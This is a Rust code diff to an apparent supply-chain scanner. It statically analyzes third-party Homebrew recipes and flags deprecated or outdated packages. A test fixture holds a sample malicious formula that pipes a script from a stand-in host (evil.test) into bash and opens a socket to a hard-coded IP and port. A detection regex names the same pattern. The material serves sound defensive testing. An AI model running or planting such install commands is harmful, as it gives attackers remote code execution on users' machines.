@@ -134,6 +134,10 @@ struct Formula {
     tap: Option<String>,
     #[serde(default)]
     installed: Vec<Installed>,
+    #[serde(default)]
+    deprecated: bool,
+    #[serde(default)]
+    disabled: bool,
 }
 
 #[derive(Deserialize)]
@@ -189,22 +193,43 @@ pub fn brew_inventory() -> Result<Inventory> {
         anyhow::bail!("`brew info` failed: {}", String::from_utf8_lossy(&out.stderr).trim());
     }
     let (taps, tap_remote) = read_tap_info();
-    let (deps, casks, signals) =
+    let Parsed { deps, casks, mut signals, third_party } =
         analyze(&out.stdout, &tap_remote).context("parsing brew JSON")?;
+
+    // Static-analyze the install recipe of each third-party package (its brew
+    // Ruby) — the untrusted install code. Core/official recipes are skipped.
+    for (name, is_cask) in &third_party {
+        for sig in analyze_install_code(name, *is_cask) {
+            signals.entry(name.clone()).or_default().push(sig);
+        }
+    }
+
+    // Version drift is a separate `brew outdated` query, merged into the signals.
+    for (name, (installed, current)) in read_outdated() {
+        signals.entry(name).or_default().push(outdated_signal(&installed, &current));
+    }
     Ok(Inventory { manager: "homebrew", deps, taps, casks, signals })
 }
 
 /// The output of [`analyze`]: the packages (formulae forest + cask roots), the
-/// cask count, and the offline risk signals keyed by package name.
-type Analyzed = (Vec<Dependency>, usize, HashMap<String, Vec<SysSignal>>);
+/// cask count, the offline risk signals keyed by package name, and the list of
+/// third-party packages `(name, is_cask)` whose install recipe should be
+/// statically analyzed (core/official recipes are review-gated, so skipped).
+struct Parsed {
+    deps: Vec<Dependency>,
+    casks: usize,
+    signals: HashMap<String, Vec<SysSignal>>,
+    third_party: Vec<(String, bool)>,
+}
 
 /// Turn `brew info --json=v2` output into the dependency forest, the cask count,
 /// and the offline risk signals. `tap_remote` maps a tap handle to its real git
 /// remote (used to point a third-party package at its tap's repo). Split from the
 /// shell-out so it's unit-testable against a fixture.
-fn analyze(json: &[u8], tap_remote: &HashMap<String, String>) -> Result<Analyzed> {
+fn analyze(json: &[u8], tap_remote: &HashMap<String, String>) -> Result<Parsed> {
     let parsed: BrewOut = serde_json::from_slice(json)?;
     let mut signals: HashMap<String, Vec<SysSignal>> = HashMap::new();
+    let mut third_party: Vec<(String, bool)> = Vec::new();
 
     // --- formulae: the dependency forest ---
     let version: HashMap<&str, &str> = parsed
@@ -232,17 +257,22 @@ fn analyze(json: &[u8], tap_remote: &HashMap<String, String>) -> Result<Analyzed
     for f in &parsed.formulae {
         let Some(inst) = f.installed.first() else { continue };
         // Third-party tap → provenance signal + carry the tap's remote so the
-        // resolver assesses the tap repo instead of reporting "no repository".
-        let third_party = f.tap.as_deref().filter(|t| !is_official_tap(t));
-        if let Some(tap) = third_party {
-            push_signal(&mut signals, &f.name, third_party_tap(tap));
+        // resolver assesses the tap repo instead of reporting "no repository",
+        // and mark it for install-recipe analysis.
+        let tap = f.tap.as_deref().filter(|t| !is_official_tap(t));
+        if let Some(t) = tap {
+            push_signal(&mut signals, &f.name, third_party_tap(t));
+            third_party.push((f.name.clone(), false));
+        }
+        if f.deprecated || f.disabled {
+            push_signal(&mut signals, &f.name, deprecated_signal());
         }
         deps.push(Dependency {
             name: f.name.clone(),
             version: inst.version.clone(),
             ecosystem: Ecosystem::Brew,
             direct: inst.installed_on_request,
-            resolved_url: third_party.and_then(|t| tap_remote.get(t).cloned()),
+            resolved_url: tap.and_then(|t| tap_remote.get(t).cloned()),
             integrity: None,
             parents: parents.remove(&f.name).unwrap_or_default(),
         });
@@ -254,6 +284,7 @@ fn analyze(json: &[u8], tap_remote: &HashMap<String, String>) -> Result<Analyzed
         let mut sigs = cask_signals(c);
         if let Some(tap) = c.tap.as_deref().filter(|t| !is_official_tap(t)) {
             sigs.push(third_party_tap(tap));
+            third_party.push((c.token.clone(), true));
         }
         if !sigs.is_empty() {
             signals.entry(c.token.clone()).or_default().extend(sigs);
@@ -270,12 +301,23 @@ fn analyze(json: &[u8], tap_remote: &HashMap<String, String>) -> Result<Analyzed
         });
     }
 
-    Ok((deps, casks, signals))
+    Ok(Parsed { deps, casks, signals, third_party })
 }
 
 /// The provenance signal for a package installed from a non-official tap.
 fn third_party_tap(tap: &str) -> SysSignal {
     SysSignal::new(format!("third-party-tap ({tap})"), Severity::Medium, 30)
+}
+
+/// A deprecated/disabled package — unmaintained, likely to accrue unfixed bugs.
+fn deprecated_signal() -> SysSignal {
+    SysSignal::new("deprecated", Severity::Medium, 20)
+}
+
+/// An installed version behind the current one — running old code means missing
+/// upstream (including security) fixes. Mild on its own.
+fn outdated_signal(installed: &str, current: &str) -> SysSignal {
+    SysSignal::new(format!("outdated ({installed} → {current})"), Severity::Low, 10)
 }
 
 fn push_signal(map: &mut HashMap<String, Vec<SysSignal>>, name: &str, sig: SysSignal) {
@@ -314,9 +356,129 @@ fn cask_signals(c: &Cask) -> Vec<SysSignal> {
         out.push(SysSignal::new("auto-updates", Severity::Info, 0));
     }
     if c.deprecated || c.disabled {
-        out.push(SysSignal::new("deprecated", Severity::Medium, 20));
+        out.push(deprecated_signal());
     }
     out
+}
+
+/// `brew outdated --json` → installed packages behind their current version,
+/// mapped `name → (installed, current)`. Best-effort: a failure yields none.
+fn read_outdated() -> HashMap<String, (String, String)> {
+    #[derive(Deserialize)]
+    struct Out {
+        name: String,
+        #[serde(default)]
+        installed_versions: Vec<String>,
+        #[serde(default)]
+        current_version: Option<String>,
+    }
+    #[derive(Deserialize, Default)]
+    struct OutAll {
+        #[serde(default)]
+        formulae: Vec<Out>,
+        #[serde(default)]
+        casks: Vec<Out>,
+    }
+    let Ok(out) = Command::new("brew").args(["outdated", "--json"]).output() else {
+        return HashMap::new();
+    };
+    if !out.status.success() {
+        return HashMap::new();
+    }
+    let all: OutAll = serde_json::from_slice(&out.stdout).unwrap_or_default();
+    all.formulae
+        .into_iter()
+        .chain(all.casks)
+        .filter_map(|x| {
+            let cur = x.current_version?;
+            let inst = x.installed_versions.first().cloned().unwrap_or_default();
+            Some((x.name, (inst, cur)))
+        })
+        .collect()
+}
+
+// --- install-recipe static analysis (third-party packages only) --------------
+
+/// Fetch a package's Homebrew recipe (its Ruby) via `brew cat` and static-analyze
+/// it. Only called for third-party packages — the untrusted install code.
+fn analyze_install_code(name: &str, is_cask: bool) -> Vec<SysSignal> {
+    match brew_cat(name, is_cask) {
+        Some(ruby) => recipe_signals(name, &ruby),
+        None => Vec::new(),
+    }
+}
+
+/// `brew cat [--cask] <name>` → the recipe's Ruby source.
+fn brew_cat(name: &str, is_cask: bool) -> Option<String> {
+    let mut cmd = Command::new("brew");
+    cmd.arg("cat");
+    if is_cask {
+        cmd.arg("--cask");
+    }
+    let out = cmd.arg(name).output().ok()?;
+    out.status
+        .success()
+        .then(|| String::from_utf8_lossy(&out.stdout).into_owned())
+}
+
+/// Static-analyze a recipe's Ruby source. Reuses the language analyzers (IOC /
+/// obfuscation / sensitive-API, `Lang::Ruby`) by staging the source in a temp
+/// dir, plus a brew-specific pass for install-time remote code execution.
+/// Pure of subprocesses, so it's unit-testable on a raw recipe string.
+fn recipe_signals(name: &str, ruby: &str) -> Vec<SysSignal> {
+    let mut sigs = Vec::new();
+
+    if let Some(dir) = stage_recipe(name, ruby) {
+        let mut findings = Vec::new();
+        crate::analyze::ioc::scan_dir(&dir, &mut findings, crate::analyze::ioc::Lang::Ruby);
+        crate::analyze::obfuscation::scan_dir(
+            &dir,
+            &mut findings,
+            crate::analyze::obfuscation::Lang::Ruby,
+        );
+        crate::analyze::sensitive_api::scan_dir(
+            &dir,
+            &mut findings,
+            crate::analyze::sensitive_api::Lang::Ruby,
+        );
+        let _ = std::fs::remove_dir_all(&dir);
+        // Cap so one noisy recipe can't flood the node with signals.
+        sigs.extend(findings.iter().take(6).map(finding_to_signal));
+    }
+
+    // Piping a download straight into a shell/interpreter during install — the
+    // clearest install-time remote-code-execution tell.
+    let pipe = regex::Regex::new(r"(?i)(curl|wget|fetch)\b[^\n|]*\|\s*(sudo\s+)?(sh|bash|zsh|ruby|python)")
+        .expect("static regex");
+    if pipe.is_match(ruby) {
+        sigs.push(SysSignal::new("install-remote-exec (pipe to shell)", Severity::High, 40));
+    }
+    sigs
+}
+
+/// A finding from a language analyzer → a system signal, e.g.
+/// `install-ioc (203.0.113.5)`. Points scale with severity.
+fn finding_to_signal(f: &crate::model::Finding) -> SysSignal {
+    let points = match f.severity {
+        Severity::Critical | Severity::High => 40,
+        Severity::Medium => 20,
+        Severity::Low => 10,
+        Severity::Info => 0,
+    };
+    let label =
+        format!("install-{} ({})", f.category.as_str(), crate::analyze::util::snippet(&f.detail, 40));
+    SysSignal::new(label, f.severity, points)
+}
+
+/// Write a recipe to a fresh temp dir as `recipe.rb`, so the directory-oriented
+/// analyzers can read it. Returns the dir (caller removes it).
+fn stage_recipe(name: &str, ruby: &str) -> Option<std::path::PathBuf> {
+    let safe: String =
+        name.chars().map(|c| if c.is_ascii_alphanumeric() { c } else { '_' }).collect();
+    let dir = std::env::temp_dir().join(format!("postmortem-recipe-{}-{safe}", std::process::id()));
+    std::fs::create_dir_all(&dir).ok()?;
+    std::fs::write(dir.join("recipe.rb"), ruby).ok()?;
+    Some(dir)
 }
 
 /// A cask artifact that runs an installer (`pkg`/`installer`) rather than just
@@ -497,7 +659,7 @@ mod tests {
             "sn0walice/sshm".to_string(),
             "https://github.com/Sn0wAlice/sshm".to_string(),
         )]);
-        let (deps, casks, signals) = analyze(json, &tap_remote).unwrap();
+        let Parsed { deps, casks, signals, .. } = analyze(json, &tap_remote).unwrap();
         assert_eq!(deps.len(), 2);
         assert_eq!(casks, 0);
         let app = deps.iter().find(|d| d.name == "app").unwrap();
@@ -526,7 +688,7 @@ mod tests {
               "artifacts": [ { "pkg": ["x.pkg"] }, { "uninstall": [] } ] }
           ]
         }"#;
-        let (deps, casks, signals) = analyze(json, &HashMap::new()).unwrap();
+        let Parsed { deps, casks, signals, .. } = analyze(json, &HashMap::new()).unwrap();
         assert_eq!(casks, 1);
         let risky = deps.iter().find(|d| d.name == "risky").unwrap();
         assert!(risky.direct, "casks are user-installed roots");
@@ -555,8 +717,40 @@ mod tests {
               "artifacts": [ { "app": ["A.app"] } ] }
           ]
         }"#;
-        let (_deps, _casks, signals) = analyze(json, &HashMap::new()).unwrap();
+        let Parsed { signals, .. } = analyze(json, &HashMap::new()).unwrap();
         assert!(!signals.contains_key("ok"), "verified github cask has no offline signals");
+    }
+
+    #[test]
+    fn recipe_signals_flags_remote_exec_and_iocs() {
+        // A malicious-looking formula: pipes a remote script into bash during
+        // install, and hits a hard-coded IP.
+        let ruby = r#"
+            class Evil < Formula
+              url "https://example.com/evil-1.0.tgz"
+              def install
+                system "curl -fsSL https://evil.test/x.sh | bash"
+                system "ruby", "-e", "TCPSocket.open('203.0.113.5', 4444)"
+              end
+            end
+        "#;
+        let labels: Vec<String> =
+            recipe_signals("evil", ruby).into_iter().map(|s| s.label).collect();
+        assert!(
+            labels.iter().any(|l| l.contains("install-remote-exec")),
+            "curl|bash pipe flagged: {labels:?}"
+        );
+        assert!(
+            labels.iter().any(|l| l.starts_with("install-")),
+            "reused analyzers produced install-* signals: {labels:?}"
+        );
+
+        // A benign recipe yields nothing.
+        let clean = r#"class Ok < Formula
+              url "https://github.com/o/r/archive/1.0.tar.gz"
+              def install; bin.install "ok"; end
+            end"#;
+        assert!(recipe_signals("ok", clean).is_empty(), "clean recipe is quiet");
     }
 
     #[test]
@@ -569,7 +763,8 @@ mod tests {
           ]
         }"#;
         let remote = HashMap::from([("sn0walice/x".to_string(), "https://github.com/o/x".to_string())]);
-        let (deps, _casks, signals) = analyze(json, &remote).unwrap();
+        let Parsed { deps, signals, third_party, .. } = analyze(json, &remote).unwrap();
+        assert_eq!(third_party, vec![("app".to_string(), false)], "flagged for recipe analysis");
         let mut forest = tree::build("brew", &["brew".to_string()], &deps, None);
         annotate(&mut forest, &signals);
         let app = &forest.roots[0];
